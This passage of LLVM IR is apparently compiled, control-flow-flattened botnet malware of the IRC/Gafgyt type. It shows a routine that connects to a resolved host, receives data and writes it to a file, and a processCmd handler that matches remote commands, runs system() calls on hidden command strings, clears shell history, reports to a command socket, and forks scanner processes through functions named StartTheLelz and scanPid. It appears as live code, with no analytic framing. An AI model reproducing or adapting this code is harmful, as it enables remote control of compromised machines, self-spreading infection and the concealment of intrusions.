  %72 = call %struct.hostent* @gethostbyname(i8* %71)
  store %struct.hostent* %72, %struct.hostent** %14, align 8
  %73 = icmp eq %struct.hostent* %72, null
  %74 = select i1 %73, i32 -615627394, i32 -1659101448
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 2, i32* %3, align 4
  store i32 433393984, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %78 = bitcast %struct.in_addr* %77 to i8*
  %79 = load %struct.hostent*, %struct.hostent** %14, align 8
  %80 = getelementptr inbounds %struct.hostent, %struct.hostent* %79, i32 0, i32 4
  %81 = load i8**, i8*** %80, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 0
  %83 = load i8*, i8** %82, align 8
  %84 = load %struct.hostent*, %struct.hostent** %14, align 8
  %85 = getelementptr inbounds %struct.hostent, %struct.hostent* %84, i32 0, i32 3
  %86 = load i32, i32* %85, align 4
  %87 = sext i32 %86 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %78, i8* %83, i64 %87, i32 1, i1 false)
  store i32 -2130664473, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i64, i64* %10, align 8
  %90 = trunc i64 %89 to i32
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %92 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %91, i32 0, i32 0
  store i32 %90, i32* %92, align 4
  store i32 -2130664473, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %95 = bitcast [8 x i8]* %94 to i8*
  call void @llvm.memset.p0i8.i64(i8* %95, i8 0, i64 8, i32 4, i1 false)
  %96 = load i32, i32* %6, align 4
  %97 = bitcast %union.__CONST_SOCKADDR_ARG* %15 to %struct.sockaddr**
  %98 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %98, %struct.sockaddr** %97, align 8
  %99 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %15, i32 0, i32 0
  %100 = load %struct.sockaddr*, %struct.sockaddr** %99, align 8
  %101 = call i32 @connect(i32 %96, %struct.sockaddr* %100, i32 16)
  %102 = icmp ne i32 %101, 0
  %103 = select i1 %102, i32 397253007, i32 785593368
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 433393984, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %6, align 4
  %107 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %108 = load i32, i32* %7, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = getelementptr inbounds i8, i8* %110, i64 1
  %112 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %113 = call i32 (i32, i8*, ...) @sockprintf(i32 %106, i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.428, i32 0, i32 0), i8* %111, i8* %112)
  %114 = load i8*, i8** %5, align 8
  %115 = call %struct._IO_FILE* @fopen(i8* %114, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.429, i32 0, i32 0))
  store %struct._IO_FILE* %115, %struct._IO_FILE** %12, align 8
  store i32 1902369790, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %6, align 4
  %118 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %119 = call i64 @recv(i32 %117, i8* %118, i64 4096, i32 0)
  %120 = trunc i64 %119 to i32
  store i32 %120, i32* %16, align 4
  %121 = icmp sle i32 %120, 0
  %122 = select i1 %121, i32 -52012983, i32 1992675196
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 -1654013551, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %16, align 4
  %126 = icmp slt i32 %125, 4096
  %127 = select i1 %126, i32 1729012988, i32 533363332
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %16, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %130
  store i8 0, i8* %131, align 1
  store i32 533363332, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 668268654, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %8, align 4
  %135 = load i32, i32* %16, align 4
  %136 = icmp slt i32 %134, %135
  %137 = select i1 %136, i32 817559548, i32 -1194162379
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %140 = load i32, i32* %8, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8, i8* %139, i64 %141
  %143 = call i32 @strncmp(i8* %142, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.430, i32 0, i32 0), i64 4) #10
  %144 = icmp ne i32 %143, 0
  %145 = select i1 %144, i32 -1780685171, i32 134760318
  store i32 %145, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %8, align 4
  %148 = add nsw i32 %147, 4
  store i32 %148, i32* %8, align 4
  store i32 -1678496624, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %8, align 4
  %151 = load i32, i32* %16, align 4
  %152 = icmp slt i32 %150, %151
  %153 = select i1 %152, i32 -1376315560, i32 -601962789
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %8, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %156
  %158 = load i8, i8* %157, align 1
  %159 = sext i8 %158 to i32
  %160 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %161 = call i32 @fputc(i32 %159, %struct._IO_FILE* %160)
  store i32 533819547, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %8, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %8, align 4
  store i32 -1678496624, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  store i32 -450691315, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  store i32 1209289246, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  %168 = load i32, i32* %8, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %8, align 4
  store i32 668268654, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  store i32 1902369790, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  store i32 -450691315, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  store i32 -1233132180, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %6, align 4
  %175 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %176 = call i64 @recv(i32 %174, i8* %175, i64 4096, i32 0)
  %177 = trunc i64 %176 to i32
  store i32 %177, i32* %17, align 4
  %178 = icmp sle i32 %177, 0
  %179 = select i1 %178, i32 -1021205034, i32 -162316567
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -1192077705, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %17, align 4
  %183 = icmp slt i32 %182, 4096
  %184 = select i1 %183, i32 -1723783386, i32 1670056648
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* %17, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %187
  store i8 0, i8* %188, align 1
  store i32 1670056648, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  store i32 737166259, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %18, align 4
  %192 = load i32, i32* %17, align 4
  %193 = icmp slt i32 %191, %192
  %194 = select i1 %193, i32 -208225854, i32 1964165179
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i32, i32* %18, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %197
  %199 = load i8, i8* %198, align 1
  %200 = sext i8 %199 to i32
  %201 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %202 = call i32 @fputc(i32 %200, %struct._IO_FILE* %201)
  store i32 502079959, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i32, i32* %18, align 4
  %205 = add nsw i32 %204, 1
  store i32 %205, i32* %18, align 4
  store i32 737166259, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 -1233132180, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %209 = call i32 @fclose(%struct._IO_FILE* %208)
  %210 = load i32, i32* %6, align 4
  %211 = call i32 @close(i32 %210)
  store i32 0, i32* %3, align 4
  store i32 433393984, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i32, i32* %3, align 4
  ret i32 %213

loopEnd:                                          ; preds = %207, %206, %203, %195, %190, %189, %185, %181, %180, %173, %172, %171, %170, %167, %166, %165, %162, %154, %149, %146, %138, %133, %132, %128, %124, %123, %116, %105, %104, %93, %88, %76, %75, %70, %58, %55, %54, %52, %45, %38, %37, %33, %28, %23, %22, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8*, i8*, i64) #1

declare %struct.hostent* @gethostbyname(i8*) #3

declare i32 @fputc(i32, %struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem2 = alloca %struct.thread_data*
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0)) #10
  store i32 %51, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1141973475, i32* %switchVar
  %.reg2mem9 = alloca i32
  %.reg2mem11 = alloca i32
  %.reg2mem13 = alloca i32
  %.reg2mem15 = alloca i32
  %.reg2mem17 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1141973475, label %first
    i32 1207905004, label %54
    i32 -1317939688, label %61
    i32 -833545665, label %65
    i32 1680958153, label %72
    i32 436149505, label %76
    i32 501741794, label %83
    i32 466534617, label %87
    i32 -1416985205, label %94
    i32 1761832388, label %98
    i32 1562394458, label %99
    i32 -525334167, label %106
    i32 -1172918573, label %109
    i32 -522496955, label %116
    i32 -2147353565, label %120
    i32 1211332795, label %127
    i32 -1792012000, label %130
    i32 1921975903, label %137
    i32 -1811505527, label %144
    i32 -1770485199, label %148
    i32 -1150997367, label %149
    i32 203451370, label %154
    i32 -541172349, label %161
    i32 1856952554, label %165
    i32 -2060321553, label %166
    i32 1989928701, label %174
    i32 974960041, label %176
    i32 713751501, label %180
    i32 -388939389, label %181
    i32 1937604438, label %182
    i32 -1480216542, label %187
    i32 789965645, label %192
    i32 -695435516, label %195
    i32 -2082881607, label %198
    i32 1310373541, label %199
    i32 -559540232, label %200
    i32 1794957148, label %207
    i32 -166410201, label %211
    i32 -1904030887, label %216
    i32 -123850938, label %217
    i32 268955490, label %224
    i32 -936650549, label %229
    i32 74315876, label %236
    i32 -1650102782, label %240
    i32 -559444423, label %247
    i32 -874783574, label %254
    i32 -1746957209, label %261
    i32 1460639586, label %268
    i32 1809481823, label %275
    i32 694850724, label %282
    i32 -471505062, label %289
    i32 2027474480, label %293
    i32 -249024527, label %300
    i32 -425862691, label %303
    i32 983903482, label %326
    i32 -216861433, label %331
    i32 822933115, label %332
    i32 -968719489, label %336
    i32 473916723, label %341
    i32 -994510892, label %342
    i32 -1754166013, label %346
    i32 -609877545, label %351
    i32 1745252708, label %352
    i32 -335869723, label %357
    i32 1432007156, label %360
    i32 -1914577491, label %364
    i32 1907187364, label %368
    i32 -333807070, label %377
    i32 -612550766, label %379
    i32 69619235, label %380
    i32 776449168, label %384
    i32 326460809, label %393
    i32 -28750946, label %394
    i32 1713547901, label %395
    i32 -1710772176, label %402
    i32 -1976480182, label %406
    i32 906404493, label %413
    i32 -1359284251, label %420
    i32 2055231367, label %427
    i32 1696214912, label %434
    i32 -481583359, label %438
    i32 1662610630, label %445
    i32 -401114714, label %449
    i32 1171264228, label %456
    i32 -167071104, label %459
    i32 1312545015, label %481
    i32 1494039912, label %486
    i32 1545747032, label %487
    i32 671007060, label %491
    i32 1633965332, label %496
    i32 2021057126, label %497
    i32 -1454554768, label %502
    i32 133471522, label %505
    i32 -897949718, label %509
    i32 893872456, label %513
    i32 -1722366503, label %521
    i32 -1479706678, label %523
    i32 1340996880, label %524
    i32 -1614014499, label %528
    i32 1391127192, label %536
    i32 2132777573, label %537
    i32 -2119052370, label %538
    i32 -974771778, label %545
    i32 1475380763, label %549
    i32 -1603486522, label %552
    i32 1229582082, label %559
    i32 620267089, label %564
    i32 -158227223, label %568
    i32 -1815584305, label %572
    i32 -287852226, label %595
    i32 1955451681, label %597
    i32 441963021, label %598
    i32 -841844833, label %602
    i32 211932933, label %603
    i32 1046241598, label %626
    i32 1906897545, label %627
    i32 723115762, label %634
    i32 4808569, label %638
    i32 650876716, label %639
    i32 -1647197704, label %643
    i32 -37334669, label %646
    i32 1658667709, label %650
    i32 2083301479, label %685
    i32 -704295156, label %690
    i32 -1246576282, label %728
    i32 2061273460, label %731
    i32 -1161875899, label %733
    i32 541601170, label %734
    i32 1452536123, label %741
    i32 1824150781, label %745
    i32 907181631, label %752
    i32 334928467, label %759
    i32 -77586927, label %762
    i32 805569812, label %778
    i32 1116596450, label %781
    i32 -2016706511, label %785
    i32 313599006, label %789
    i32 1902190366, label %795
    i32 1820865050, label %797
    i32 1290863403, label %798
    i32 -592183059, label %802
    i32 -1096100741, label %803
    i32 452268723, label %807
    i32 -348657697, label %808
    i32 287187832, label %815
    i32 1504926749, label %819
    i32 -105090153, label %826
    i32 787415761, label %829
    i32 -1309208872, label %845
    i32 1349154428, label %848
    i32 -688029158, label %852
    i32 -2120393382, label %856
    i32 -840636005, label %862
    i32 -1743174580, label %864
    i32 -1006773429, label %865
    i32 1481589586, label %869
    i32 -1971617345, label %870
    i32 -753777410, label %874
    i32 1300762162, label %875
    i32 1467700598, label %882
    i32 -145539294, label %886
    i32 1712817235, label %893
    i32 -2060743500, label %900
    i32 -1897280899, label %903
    i32 991846402, label %919
    i32 1313044117, label %922
    i32 6704733, label %926
    i32 -1013413290, label %930
    i32 733141893, label %934
    i32 -300777063, label %936
    i32 -1755045307, label %937
    i32 2140456057, label %941
    i32 -1457109001, label %942
    i32 -454642388, label %946
    i32 605320799, label %947
    i32 1647084444, label %954
    i32 -523642626, label %955
    i32 -1974075293, label %961
    i32 847183192, label %968
    i32 -1069230855, label %976
    i32 803186226, label %984
    i32 -1051676815, label %985
    i32 2116031457, label %988
    i32 -63810277, label %992
    i32 -1132610098, label %996
    i32 -1117594870, label %999
    i32 1088159816, label %1000
    i32 34582212, label %1007
    i32 649222986, label %1008
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %52 = icmp ne i32 %.reload, 0
  %53 = select i1 %52, i32 1562394458, i32 1207905004
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8**, i8*** %4, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @strcmp(i8* %57, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.432, i32 0, i32 0)) #10
  %59 = icmp ne i32 %58, 0
  %60 = select i1 %59, i32 -833545665, i32 -1317939688
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @system(i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.433, i32 0, i32 0))
  call void @ClearHistory()
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.434, i32 0, i32 0))
  store i32 -833545665, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @strcmp(i8* %68, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %70 = icmp ne i32 %69, 0
  %71 = select i1 %70, i32 436149505, i32 1680958153
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = call i32 @system(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.436, i32 0, i32 0))
  call void @ClearHistory()
  %74 = load i32, i32* @mainCommSock, align 4
  %75 = call i32 (i32, i8*, ...) @sockprintf(i32 %74, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.437, i32 0, i32 0))
  store i32 436149505, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @strcmp(i8* %79, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %81 = icmp ne i32 %80, 0
  %82 = select i1 %81, i32 466534617, i32 501741794
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  %84 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.439, i32 0, i32 0))
  call void @ClearHistory()
  %85 = load i32, i32* @mainCommSock, align 4
  %86 = call i32 (i32, i8*, ...) @sockprintf(i32 %85, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.440, i32 0, i32 0))
  store i32 466534617, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8**, i8*** %4, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  %91 = call i32 @strcmp(i8* %90, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.441, i32 0, i32 0)) #10
  %92 = icmp ne i32 %91, 0
  %93 = select i1 %92, i32 1761832388, i32 -1416985205
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call i32 @system(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.442, i32 0, i32 0))
  call void @ClearHistory()
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.443, i32 0, i32 0))
  store i32 1761832388, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 1562394458, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8**, i8*** %4, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 0
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @strcmp(i8* %102, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %104 = icmp ne i32 %103, 0
  %105 = select i1 %104, i32 -1172918573, i32 -525334167
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.444, i32 0, i32 0))
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 0
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.445, i32 0, i32 0)) #10
  %114 = icmp ne i32 %113, 0
  %115 = select i1 %114, i32 -2147353565, i32 -522496955
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 @getdtablesize() #2
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i32 0, i32 0), i32 %118)
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 0
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @strcmp(i8* %123, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.435, i32 0, i32 0)) #10
  %125 = icmp ne i32 %124, 0
  %126 = select i1 %125, i32 -1792012000, i32 1211332795
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i32, i32* @mainCommSock, align 4
  %129 = call i32 (i32, i8*, ...) @sockprintf(i32 %128, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.446, i32 0, i32 0))
  call void (i32, ...) bitcast (void ()* @binsBins to void (i32, ...)*)(i32 1)
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 0
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @strcmp(i8* %133, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.447, i32 0, i32 0)) #10
  %135 = icmp ne i32 %134, 0
  %136 = select i1 %135, i32 -559540232, i32 1921975903
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 1
  %140 = load i8*, i8** %139, align 8
  %141 = call i32 @strcmp(i8* %140, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.438, i32 0, i32 0)) #10
  %142 = icmp ne i32 %141, 0
  %143 = select i1 %142, i32 203451370, i32 -1811505527
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i32, i32* @scanPid, align 4
  %146 = icmp eq i32 %145, 0
  %147 = select i1 %146, i32 -1770485199, i32 -1150997367
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* @scanPid, align 4
  %151 = call i32 @kill(i32 %150, i32 9) #2
  %152 = load i32, i32* @mainCommSock, align 4
  %153 = call i32 (i32, i8*, ...) @sockprintf(i32 %152, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.448, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  store i32 203451370, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 1
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @strcmp(i8* %157, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.449, i32 0, i32 0)) #10
  %159 = icmp ne i32 %158, 0
  %160 = select i1 %159, i32 1310373541, i32 -541172349
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i32, i32* @scanPid, align 4
  %163 = icmp ne i32 %162, 0
  %164 = select i1 %163, i32 1856952554, i32 -2060321553
  store i32 %164, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call i32 @fork() #2
  store i32 %167, i32* %5, align 4
  store i32 8192, i32* %7, align 4
  %168 = call i64 @sysconf(i32 84) #2
  %169 = mul nsw i64 %168, 64
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %8, align 4
  store i32 10, i32* %9, align 4
  %171 = load i32, i32* %5, align 4
  %172 = icmp sgt i32 %171, 0
  %173 = select i1 %172, i32 1989928701, i32 974960041
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i32, i32* %5, align 4
  store i32 %175, i32* @scanPid, align 4
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %5, align 4
  %178 = icmp eq i32 %177, -1
  %179 = select i1 %178, i32 713751501, i32 -388939389
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 1937604438, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* @mainCommSock, align 4
  %184 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %185 = call i8* @inet_ntoa(i32 %184) #2
  %186 = call i32 (i32, i8*, ...) @sockprintf(i32 %183, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.450, i32 0, i32 0), i8* %185)
  store i32 0, i32* %6, align 4
  store i32 -1480216542, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i32, i32* %6, align 4
  %189 = load i32, i32* %8, align 4
  %190 = icmp slt i32 %188, %189
  %191 = select i1 %190, i32 789965645, i32 -2082881607
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %9, align 4
  %194 = load i32, i32* %7, align 4
  call void @StartTheLelz(i32 %193, i32 %194)
  store i32 -695435516, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i32, i32* %6, align 4
  %197 = add nsw i32 %196, 1
  store i32 %197, i32* %6, align 4
  store i32 -1480216542, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  call void @_exit(i32 0) #12
  unreachable

; <label>:199:                                    ; preds = %loopEntry
  store i32 -559540232, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 0
  %203 = load i8*, i8** %202, align 8
